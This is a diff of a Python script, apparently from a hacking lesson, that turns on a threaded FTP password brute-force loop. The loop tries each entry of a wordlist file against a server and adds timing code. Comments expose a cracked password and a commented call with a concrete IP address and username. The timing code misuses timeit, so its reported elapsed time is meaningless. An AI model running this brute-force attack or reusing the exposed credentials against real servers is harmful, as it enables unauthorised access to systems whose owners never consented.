@@ -15,6 +15,7 @@ import contextlib
 import os
 import re
 from ftplib import FTP, all_errors
+import timeit
 
 # https://www.thepythoncode.com/article/brute-force-attack-ftp-servers-using-ftplib-in-python
 
@@ -47,18 +48,22 @@ os.chdir('./Lesson10')
 
 # bruting ftp password
 # psw= hacker9900
-# with open('psw.txt') as file:
-#     pswds = file.read().split("\n")
-# password_for_ftp = ""
-# with concurrent.futures.ThreadPoolExecutor() as executor:
-#     futures = []
-#     for p in pswds:
-#         futures.append(executor.submit(try_ftp, p))
-#     for future in concurrent.futures.as_completed(futures):
-#         if future.result() is not None:
-#             password_for_ftp = future.result()
-#             print(f"Password for ftp: {password_for_ftp}")
-#             executor.shutdown(wait=False)
+start = timeit.timeit()
+with open('psw.txt') as file:
+    pswds = file.read().split("\n")
+password_for_ftp = ""
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    futures = []
+    for p in pswds:
+        futures.append(executor.submit(try_ftp, p))
+    for future in concurrent.futures.as_completed(futures):
+        if future.result() is not None:
+            password_for_ftp = future.result()
+            print(f"Password for ftp: {password_for_ftp}")
+            executor.shutdown(wait=False)
+stop = timeit.timeit()
+elapsed_time = stop - start
+print(f"Elapsed time: {elapsed_time}")
 
 # get file from ftp
 # work_ftp("45.143.93.4", "test_user", "hacker9900")
